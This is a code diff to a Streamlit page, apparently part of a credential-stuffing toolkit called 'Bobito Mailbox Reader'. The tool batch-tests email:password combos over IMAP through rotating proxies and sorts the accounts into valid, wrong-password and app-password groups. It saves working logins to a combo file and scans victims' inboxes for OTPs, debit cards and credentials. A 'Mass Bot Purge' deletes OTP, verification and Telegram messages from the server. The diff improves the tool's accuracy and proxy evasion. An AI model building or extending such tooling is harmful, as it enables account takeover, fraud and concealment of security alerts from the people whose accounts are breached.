@@ -1,3 +1,30 @@
+"""
+pages/3_Mailbox_Reader.py — Bobito Mailbox Reader & Portal Hub  (v13.37)
+=======================================================================
+Interactive inbox inspection: bot intelligence, OTP / debit-card / credential
+scanning, multi-field search, Telegram + blacklist filtering.
+
+v13.37 fixes on this page
+-------------------------
+* Renamed 1_Mailbox_Reader.py -> 3_Mailbox_Reader.py (page-number collision).
+* st.set_page_config() hoisted to be the FIRST Streamlit call, before any
+  module-level work, as Streamlit requires.
+* MsTokenRejected.verdict was thrown away, so a KNOWN-wrong Microsoft password
+  fell through to basic auth and was reported as APPASS.  The reader now raises
+  MsVerdict("WRONG" | "APPASS") and STOPS host-hopping on a definitive answer.
+* open_imap() gated the STARTTLS / plaintext rungs on int(port) == 993, so a
+  port-143 account dialled implicit TLS on 143 and then gave up.  The ladder is
+  built from the configured port.
+* The batch importer PREPENDED to clean_valid_accounts.txt while app.py
+  OVERWROTE it.  Both sides merge now, deduped by email.
+* load_valid() and generate_all_mail_zip() are mtime-cached; IMAP-UTF7 decode is
+  memoised.
+* The proxy is probed and rotated instead of blindly taking pool[0], and the
+  path actually used is reported.
+* Mass Bot Purge says what it really is: a per-term SERVER search + expunge, not
+  a purge of the listed rows only.
+"""
+
 import streamlit as st
 import imaplib
 import glob
@@ -18,6 +45,14 @@ from typing import List, Tuple
 from email.header import decode_header
 from email import message_from_bytes
 
+# --- Page Config (MUST be the first Streamlit call) ---   # v13.37: hoisted
+st.set_page_config(
+    page_title="Bobito Mailbox Reader & Portal Hub",
+    page_icon="📥",
+    layout="wide",
+    initial_sidebar_state="expanded"
+)
+
 try:
     from hosts import host_list
 except ImportError:
@@ -34,6 +69,23 @@ except Exception:
     _ms_oauth = None
     _MS_OAUTH_OK = False
     _MS_IMAP_HOSTS = {"outlook.office365.com", "imap-mail.outlook.com"}
+
+
+# ============================================================================
+# v13.37: a DEFINITIVE Microsoft answer must not be softened into APPASS
+# ============================================================================
+class MsVerdict(Exception):
+    """Raised when Microsoft gave a definitive answer.
+
+    verdict == "WRONG"   -> the password is wrong; stop host-hopping.
+    verdict == "APPASS"  -> MFA is on; an app password is required.
+    """
+
+    def __init__(self, verdict, detail=""):
+        super().__init__(detail or verdict)
+        self.verdict = verdict
+        self.detail = detail or verdict
+
 
 # ============================================================================
 # PROVIDER KNOWLEDGE  (legacy ISP domains whose MX != their IMAP host)
@@ -410,14 +462,6 @@ def load_app_proxies() -> List[dict]:
 
     return dynamic_pool
 
-# Page Configuration & Keep-Alive Injector
-st.set_page_config(
-    page_title="Bobito Mailbox Reader & Portal Hub",
-    page_icon="📥",
-    layout="wide",
-    initial_sidebar_state="expanded"
-)
-
 st.markdown(
     """
     <script>
@@ -739,15 +783,65 @@ def _parse_proxy_str(proxy_str):
     except Exception:
         return None
 
-def _reader_proxy_str():
-    """Optional proxy for manual reader connections (sidebar toggle)."""
+# ---------------------------------------------------------------------------
+# v13.37: probe + rotate instead of blindly taking pool[0], and report the path
+# ---------------------------------------------------------------------------
+def _reader_proxy_reachable(proxy_str, host, port=993, timeout=5.0) -> bool:
+    """True if a SOCKS5/HTTP CONNECT to host:port through this node succeeds."""
+    info = _parse_proxy_str(proxy_str)
+    if not info:
+        return False
+    try:
+        import socks
+    except ImportError:
+        return False
+    try:
+        s = socks.socksocket()
+        s.set_proxy(socks.SOCKS5, info["host"], info["port"],
+                    username=info.get("user"), password=info.get("pass"),
+                    rdns=True)
+        s.settimeout(timeout)
+        s.connect((host, int(port)))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+def _reader_proxy_str(host: str = ""):
+    """Optional proxy for manual reader connections (sidebar toggle).
+
+    v13.37: tries each pool entry against the real target host and returns the
+    first one that connects, instead of returning pool[0] and hoping.
+    Records the outcome in st.session_state["_reader_proxy_path"] so the UI can
+    state the truth rather than guess.
+    """
     try:
         if not st.session_state.get("reader_use_proxy", False):
+            st.session_state["_reader_proxy_path"] = "direct (proxy toggle OFF)"
             return None
         pool = load_app_proxies()
-        return pool[0]["proxy"] if pool else None
-    except Exception:
+        if not pool:
+            st.session_state["_reader_proxy_path"] = "direct (no pool)"
+            return None
+        target = host or "imap.gmail.com"
+        for item in pool[:8]:
+            px = item.get("proxy")
+            if not px:
+                continue
+            if _reader_proxy_reachable(px, target, 993):
+                st.session_state["_reader_proxy_path"] = f"via {px} ({item.get('country')})"
+                return px
+        st.session_state["_reader_proxy_path"] = "direct (every probed node failed)"
         return None
+    except Exception:
+        st.session_state["_reader_proxy_path"] = "direct (probe error)"
+        return None
+
+def _conn_path() -> str:
+    try:
+        return st.session_state.get("_reader_proxy_path", "unknown")
+    except Exception:
+        return "unknown"
 
 def _raw_socket(host, port, timeout, proxy_str=None):
     """Direct socket, or proxied via SOCKS5/HTTP. Falls back to direct if the
@@ -849,33 +943,33 @@ class _XOAUTH2IMAP4SSL(_ProxyIMAP4SSL):
                          proxy_str=proxy_str, verify=not insecure)
 
 def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
-    """Implicit TLS on 993 first, then STARTTLS on 143, then plaintext 143.
+    """v13.37: the ladder is built from the CONFIGURED port.
 
-    The plaintext rung matters: legacy / Zimbra servers answer
-    'TLS not supported by server' on 143 but still accept a cleartext LOGIN.
+    Before, the STARTTLS and plaintext rungs were gated on int(port) == 993, so
+    a port-143 account dialled implicit TLS on 143 and then gave up entirely.
+    The plaintext rung still matters: legacy / Zimbra servers answer
+    'TLS not supported by server' on 143 but accept a cleartext LOGIN.
     """
     if try_starttls is None:
         try_starttls = bool(st.session_state.app_config.get("try_starttls", True))
 
+    port = int(port or 993)
+    if port == 143:
+        ladder = [("starttls", 143), ("plain", 143), ("implicit", 993)]
+    else:
+        ladder = [("implicit", port), ("starttls", 143), ("plain", 143)]
+
     last = None
-    try:
-        m = _ProxyIMAP4SSL(host, port, timeout=timeout, proxy_str=proxy_str, verify=False)
-        _ensure_file(m)
-        return m
-    except Exception as e:
-        last = e
-
-    if try_starttls and int(port) == 993:
+    for mode, p in ladder:
         try:
-            m = _ProxyIMAP4(host, 143, timeout=timeout, proxy_str=proxy_str)
-            m.starttls(ssl_context=_mail_tls_context(False))
-            _ensure_file(m)
-            return m
-        except Exception as e:
-            last = e
-
-        try:
-            m = _ProxyIMAP4(host, 143, timeout=timeout, proxy_str=proxy_str)
+            if mode == "implicit":
+                m = _ProxyIMAP4SSL(host, p, timeout=timeout, proxy_str=proxy_str, verify=False)
+            else:
+                m = _ProxyIMAP4(host, p, timeout=timeout, proxy_str=proxy_str)
+                if mode == "starttls" and try_starttls:
+                    m.starttls(ssl_context=_mail_tls_context(False))
+                elif mode == "starttls" and not try_starttls:
+                    continue
             _ensure_file(m)
             return m
         except Exception as e:
@@ -915,30 +1009,55 @@ def _looks_like_network_error(err_text: str) -> bool:
         "rate limit", "throttl", "no setter", "dns",
     ))
 
-def load_valid():
-    """Optimized instant loader: Scans only valid text result files, bypassing heavy log scanning."""
-    valid_map = {}
+# ============================================================================
+# VALID ACCOUNT STORAGE  (v13.37: mtime cache + real merge)
+# ============================================================================
+_VALID_FILE_PATTERNS = [
+    "mail_results/*valid*.txt",
+    "mail_results/*clean*.txt",
+    "*valid*.txt",
+    "*clean*.txt",
+    "manual_valid_accounts.txt"
+]
+_VALID_IGNORE = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
+_VALID_CACHE = {"fp": None, "options": None}   # v13.37
 
-    search_patterns = [
-        "mail_results/*valid*.txt",
-        "mail_results/*clean*.txt",
-        "*valid*.txt",
-        "*clean*.txt",
-        "manual_valid_accounts.txt"
-    ]
 
-    all_files = []
-    for pat in search_patterns:
-        all_files.extend(glob.glob(pat, recursive=True))
-
-    all_files = list(dict.fromkeys([p for p in all_files if os.path.isfile(p)]))
-    ignore_keywords = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]
-
-    for path in all_files:
-        filename_lower = os.path.basename(path).lower()
-        if any(kw in filename_lower for kw in ignore_keywords) or filename_lower == LAST_ACCOUNT_FILE:
+def _valid_files() -> List[str]:
+    files = []
+    for pat in _VALID_FILE_PATTERNS:
+        files.extend(glob.glob(pat, recursive=True))
+    out = []
+    for p in dict.fromkeys(files):
+        if not os.path.isfile(p):
             continue
+        low = os.path.basename(p).lower()
+        if any(kw in low for kw in _VALID_IGNORE) or low == LAST_ACCOUNT_FILE:
+            continue
+        out.append(p)
+    return out
 
+
+def _valid_fingerprint():
+    """v13.37: (path, mtime) for every candidate file — cheap change detector."""
+    fp = []
+    for p in _valid_files():
+        try:
+            fp.append((p, os.path.getmtime(p), os.path.getsize(p)))
+        except Exception:
+            continue
+    return tuple(sorted(fp))
+
+
+def load_valid():
+    """Optimized instant loader: scans only valid text result files, bypassing
+    heavy log scanning.  v13.37: cached until one of those files changes."""
+    fp = _valid_fingerprint()
+    if _VALID_CACHE["fp"] == fp and _VALID_CACHE["options"] is not None:
+        return list(_VALID_CACHE["options"])
+
+    valid_map = {}
+    for path in _valid_files():
         try:
             file_mtime = datetime.fromtimestamp(os.path.getmtime(path))
             with open(path, encoding="utf-8", errors="ignore") as f:
@@ -967,7 +1086,49 @@ def load_valid():
         options.append(time_label)
         options.append(combo_str)
 
-    return options if options else ["none"]
+    options = options if options else ["none"]
+    _VALID_CACHE["fp"] = fp
+    _VALID_CACHE["options"] = options
+    return list(options)
+
+
+def merge_into_clean_valid(new_combo_lines: List[str]) -> int:
+    """v13.37: MERGE into clean_valid_accounts.txt, deduped by email.
+
+    The engine used to OVERWRITE this file while this page PREPENDED to it, so a
+    batch import was destroyed by the next engine run (and vice versa).
+    Returns the number of unique accounts now stored.
+    """
+    merged = {}
+    target = "clean_valid_accounts.txt"
+    try:
+        if os.path.exists(target):
+            with open(target, encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    em = line.split("|")[0].split(":")[0].strip().lower()
+                    if "@" in em:
+                        merged[em] = line
+    except Exception:
+        pass
+    for line in new_combo_lines:
+        em = line.split("|")[0].split(":")[0].strip().lower()
+        if "@" in em:
+            merged[em] = line
+    tmp = target + ".tmp"
+    try:
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write("# email:password  (merged by the reader, newest wins)\n")
+            for em in sorted(merged):
+                f.write(merged[em] + "\n")
+        os.replace(tmp, target)
+    except Exception:
+        pass
+    _VALID_CACHE["fp"] = None
+    return len(merged)
+
 
 def delete_specific_account_from_storage(target_combo: str):
     search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
@@ -993,6 +1154,7 @@ def delete_specific_account_from_storage(target_combo: str):
                 os.remove(LAST_ACCOUNT_FILE)
             except Exception:
                 pass
+    _VALID_CACHE["fp"] = None
 
 def clear_all_valid_accounts_storage():
     search_files = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
@@ -1010,8 +1172,19 @@ def clear_all_valid_accounts_storage():
             os.remove(LAST_ACCOUNT_FILE)
         except Exception:
             pass
+    _VALID_CACHE["fp"] = None
+
+_ZIP_CACHE = {"fp": None, "blob": None}        # v13.37
+
 
 def generate_all_mail_zip():
+    """v13.37: cached on the same (path, mtime) fingerprint as load_valid()."""
+    fp = _valid_fingerprint() + tuple(sorted(
+        (p, os.path.getmtime(p)) for p in (glob.glob("mail_results/*.txt") + glob.glob("*.txt"))
+        if os.path.isfile(p)))
+    if _ZIP_CACHE["fp"] == fp and _ZIP_CACHE["blob"] is not None:
+        return _ZIP_CACHE["blob"]
+
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         search_paths = glob.glob("mail_results/*.txt") + glob.glob("*.txt")
@@ -1067,8 +1240,10 @@ def generate_all_mail_zip():
                 added_files.add(filename)
             except Exception:
                 continue
-    buf.seek(0)
-    return buf.getvalue()
+    blob = buf.getvalue()
+    _ZIP_CACHE["fp"] = fp
+    _ZIP_CACHE["blob"] = blob
+    return blob
 
 def decode_hdr(value):
     try:
@@ -1101,9 +1276,15 @@ def get_webmail_portal(email_addr):
     }
     return portals.get(domain, f"https://www.{domain}")
 
+_B64_MEMO = {}                                  # v13.37: decode memoisation
+
+
 def decode_imap_utf7(s: str) -> str:
     if "&" not in s:
         return s
+    hit = _B64_MEMO.get(s)
+    if hit is not None:
+        return hit
     res = []
     for part in s.split("&"):
         if "-" in part and not part.startswith("-"):
@@ -1119,7 +1300,10 @@ def decode_imap_utf7(s: str) -> str:
                     res.append("&" + part)
         else:
             res.append(part)
-    return "".join(res)
+    out = "".join(res)
+    if len(_B64_MEMO) < 4096:
+        _B64_MEMO[s] = out
+    return out
 
 def encode_imap_utf7(s: str) -> str:
     parts = []
@@ -1225,6 +1409,11 @@ def list_folders(mail, email_addr: str = "", host_val: str = ""):
 def connect_and_login(host, port, timeout, proxy_str, users, password, email_addr):
     """Log in on ONE host.  Microsoft hosts go over XOAUTH2 first.
 
+    v13.37: a definitive Microsoft answer (MsTokenRejected.verdict) is no longer
+    thrown away.  It raises MsVerdict("WRONG"|"APPASS") so the caller stops
+    host-hopping and reports the truth instead of falling through to basic auth
+    and labelling a known-wrong password as APPASS.
+
     Returns an OPEN logged-in mailbox, or raises the last error.
     """
     if _MS_OAUTH_OK and (host or "").lower() in _MS_IMAP_HOSTS:
@@ -1235,8 +1424,16 @@ def connect_and_login(host, port, timeout, proxy_str, users, password, email_add
             return mail
         except _ms_oauth.MsTokenTransport:
             pass                              # network blip -> fall through to basic auth
-        except _ms_oauth.MsTokenRejected:
-            pass                              # MFA / bad password -> fall through
+        except _ms_oauth.MsTokenRejected as trej:      # v13.37
+            _verdict = getattr(trej, "verdict", "")
+            _code = getattr(trej, "code", "?")
+            if _verdict == "wrong_password":
+                raise MsVerdict("WRONG", f"XOAUTH2 {_code} -> wrong password")
+            if _verdict == "need_app_password":
+                raise MsVerdict("APPASS", f"XOAUTH2 {_code} -> MFA, app password required")
+            # unknown verdict -> fall through to basic auth
+        except MsVerdict:
+            raise
         except Exception:
             pass
 
@@ -1267,7 +1464,7 @@ def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
         timeout = st.session_state.app_config.get("connection_timeout", 60)
     port_val = st.session_state.app_config.get("imap_port", 993)
     if proxy_str is None:
-        proxy_str = _reader_proxy_str()
+        proxy_str = _reader_proxy_str(host_val)
 
     users = username_candidates(email_addr)
     return connect_and_login(host_val, port_val, timeout, proxy_str,
@@ -1670,6 +1867,9 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
 
         except (socket.timeout, TimeoutError):
             log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
+        except MsVerdict as mv:                                     # v13.37
+            log_func(f"  └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
+            raise
         except Exception as ex:
             log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")
 
@@ -1810,7 +2010,8 @@ st.sidebar.header("Account & Connection Hub")
 st.sidebar.checkbox(
     "🌐 Route mailbox connections through proxy",
     key="reader_use_proxy",
-    help="Off (default) connects directly. On routes IMAP through the first proxy from proxies.txt."
+    help="Off (default) connects directly. On routes IMAP through the first proxy from proxies.txt. "
+         "v13.37: the node is PROBED against the target host first and rotated on failure."
 )
 
 if valid:
@@ -1937,6 +2138,7 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             connected_h = ""
             err_msg = ""
             auth_err = ""
+            ms_verdict = None                              # v13.37
             trace_steps = []
 
             users_to_try = username_candidates(email_val) if cfg_alt_user else [email_val]
@@ -1954,6 +2156,16 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                     is_success = True
                     status_type = "VALID"
                     trace_steps.append(f"Successfully authenticated against {h}:{cfg_port}")
+                    break
+                except MsVerdict as mv:                    # v13.37: definitive
+                    ms_verdict = mv
+                    err_msg = mv.detail
+                    trace_steps.append(f"Microsoft verdict {mv.verdict}: {mv.detail}")
+                    if test_m:
+                        try:
+                            test_m.logout()
+                        except Exception:
+                            pass
                     break
                 except Exception as ex:
                     err_msg = str(ex)
@@ -1974,6 +2186,14 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 combo_str = f"{email_val}:{pass_val}"
                 new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                 batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
+            elif ms_verdict is not None:                   # v13.37
+                if ms_verdict.verdict == "WRONG":
+                    wrong_count += 1
+                    status_type = "WRONG"
+                else:
+                    appass_count += 1
+                    status_type = "APPASS"
+                batch_logs.append(f"{'❌' if status_type == 'WRONG' else '🔑'} [{row_time}] [{status_type}] {email_val} — {ms_verdict.detail}")
             else:
                 # App-password wins over auth, network errors never count as WRONG
                 classify_src = auth_err or err_msg
@@ -2026,14 +2246,9 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         st.session_state.batch_validation_logs = batch_logs
 
         if valid_count > 0:
-            block_content = "\n".join(new_valid_entries) + "\n\n"
-            existing_data = ""
-            if os.path.exists("clean_valid_accounts.txt"):
-                with open("clean_valid_accounts.txt", "r", encoding="utf-8", errors="ignore") as f:
-                    existing_data = f.read()
-
-            with open("clean_valid_accounts.txt", "w", encoding="utf-8") as f:
-                f.write(block_content + existing_data)
+            # v13.37: MERGE (deduped by email) instead of blind prepend, so the
+            # engine's overwrite and this page's write can no longer fight.
+            merge_into_clean_valid(new_valid_entries[1:])
 
         save_session_cache()
         st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
@@ -2102,6 +2317,14 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
                     connected_host = host
                     success = True
                     break
+                except MsVerdict as mv:                    # v13.37: stop hopping
+                    last_err = f"{host}: {mv.detail} [{mv.verdict}]"
+                    if test_mail:
+                        try:
+                            test_mail.logout()
+                        except Exception:
+                            pass
+                    break
                 except Exception as ex:
                     last_err = f"{host}: {ex}"
                     if test_mail:
@@ -2167,6 +2390,8 @@ if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width
                 st.session_state.bot_filter_mode = False
                 save_session_cache()
                 st.sidebar.success("Inbox refreshed successfully!")
+        except MsVerdict as mv:                            # v13.37
+            st.sidebar.error(f"{mv.verdict}: {mv.detail}")
         except Exception as e:
             st.sidebar.error(f"Refresh failed: {e}")
 
@@ -2194,6 +2419,14 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
                     connected_host = host
                     success = True
                     break
+                except MsVerdict as mv:                    # v13.37
+                    last = f"{host}: {mv.detail} [{mv.verdict}]"
+                    if test_mail:
+                        try:
+                            test_mail.logout()
+                        except Exception:
+                            pass
+                    break
                 except Exception as e:
                     last = f"{host}: {e}"
                     if test_mail:
@@ -2216,7 +2449,7 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
             st.session_state.mb_folders = folders
             save_session_cache()
             log(f"Discovered {len(folders)} folders via {connected_host}")
-            st.success(f"Connected: {connected_host} ({len(folders)} folders)")
+            st.success(f"Connected: {connected_host} ({len(folders)} folders) — path: {_conn_path()}")
         else:
             if acc_email.split("@")[-1].lower() in ZERO_ACCESS_PROVIDERS:
                 st.error(f"{last} — this provider has no standard IMAP endpoint (needs an app password / bridge).")
@@ -2791,6 +3024,11 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
         bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)
 
     bot_page_size = st.slider("Bot Stream Results Page Size", 5, 200, 15, key="bot_page_size_slider")
+
+    # v13.37: say what the purge really is
+    st.caption("⚠️ The purge below is a per-term SERVER search (`telegram`, `otp`, `verification`, "
+               "`passcode`, `bot`) followed by \\Deleted + EXPUNGE on every hit in the selected folders. "
+               "It removes MORE than the rows previewed here.")
 
     b_act1, b_act2 = st.columns(2)
     with b_act1:
